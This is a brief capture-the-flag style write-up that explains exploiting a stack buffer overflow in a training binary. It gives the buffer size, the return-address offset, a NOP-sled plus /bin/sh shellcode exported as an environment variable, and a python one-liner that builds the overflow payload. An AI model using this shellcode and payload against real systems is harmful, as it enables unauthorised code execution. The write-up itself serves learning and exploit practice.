We can see that the programm crash with the second argument. We can't get directly control of eip with a printer for the second arg.
But we can get control of the second arg if we overwrite the first one.
First arg as a 4096 buffer lenght.
For that we fill the first buffer with 4095 characters + '\n' for the strchr.
The offeset of the second arg to get eip return adress is 9 so we put the adress of our shell code here.

$> export SHELLCODE==$(python -c 'print "\x90" * 150 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')

We create a program that give us adress of this env variable.

$> python -c "print 'A' * 4095 + '\n' + 'B' * 9 + '\x0b\xf9\xff\xbf' + 'B' * 20" > /tmp/exploit
